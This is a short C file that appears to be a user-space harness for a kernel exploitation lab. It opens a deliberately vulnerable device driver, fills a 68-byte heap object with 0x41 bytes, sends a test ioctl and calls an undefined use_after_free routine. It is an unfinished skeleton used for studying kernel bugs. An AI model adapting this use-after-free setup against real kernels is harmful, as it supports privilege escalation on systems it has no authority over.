#define _GNU_SOURCE
#include <unistd.h>
#include <sys/syscall.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <stdio.h>

#include <sys/socket.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>

#include "vuln_driver.h"

#define PATH "/dev/vulnerable_device"
#define __NR_sendmmsg 307

typedef struct k_object
{
	char buff[68];
}k_object;

int main(void)
{
	int fd = open(PATH, O_RDWR);
	char *buff = "hello";
	int ret = 0;

	k_object *obj = malloc(sizeof(k_object));
	memset(obj->buff, 0x41, sizeof(obj->buff));

	ioctl(fd, DRIVER_TEST, NULL);

	use_after_free(fd);

}
